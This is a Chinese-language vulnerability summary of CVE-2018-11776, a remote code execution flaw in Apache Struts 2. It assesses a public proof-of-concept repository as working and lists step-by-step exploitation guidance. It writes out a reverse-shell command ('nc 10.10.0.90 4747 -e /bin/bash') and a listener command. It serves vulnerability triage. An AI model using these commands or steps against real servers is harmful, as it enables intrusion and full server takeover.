## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可以远程执行任意代码，完全控制服务器

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的package和namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。根据漏洞库信息和搜索结果，此漏洞的利用依赖于 `alwaysSelectFullNamespace` 设置为 true，以及特定的package和namespace配置。攻击者可以构造恶意的OGNL表达式，通过 URL 传入，导致服务器执行任意代码。

提供的漏洞利用代码包含 `bashexploit.py` 和 `bashexploit.sh` 两个脚本，它们都尝试利用 OGNL 表达式注入执行命令。这些脚本首先尝试绕过安全限制，然后执行反弹 shell 命令，将服务器的 shell 连接到攻击者的机器。

**有效性：**
提供的POC代码有效。漏洞利用代码通过OGNL表达式注入，分两步进行攻击：
1.  移除Struts的安全限制（`setExcludedClasses('')`和`setExcludedPackageNames('')`）。
2.  执行反弹shell命令（`nc 10.10.0.90 4747 -e /bin/bash`），允许攻击者远程访问服务器。

**投毒风险：**
此仓库中没有发现明显的投毒代码。代码的功能都是围绕利用CVE-2018-11776漏洞执行远程代码，没有发现作者添加的恶意功能。所以投毒风险评估为 **0%**。

**利用方式：**
1.  **目标确认：**  确认目标 Apache Struts 版本在受影响范围内 (2.3 to 2.3.34, 2.5 to 2.5.16)，并配置了 `alwaysSelectFullNamespace=true`。
2.  **OGNL 表达式注入：** 通过构造包含恶意 OGNL 表达式的 URL 来触发漏洞。恶意 OGNL 表达式可以执行任意代码。
3.  **绕过安全限制 (可选)：**  如果 Struts 启用了安全限制，可以先使用 OGNL 表达式移除这些限制，例如设置 `excludedClasses` 和 `excludedPackageNames` 为空。
4.  **执行恶意代码：**  使用 OGNL 表达式执行任意命令。常见的利用方式是执行反弹 shell 命令，从而获得对服务器的远程访问权限。
5.  **监听端口：**  攻击者需要在攻击机器上监听相应的端口（例如 `nc -lvp 4747`），以便接收反弹 shell 连接。

**项目地址:** [m4sk0ff/CVE-2018-11776](https://github.com/m4sk0ff/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)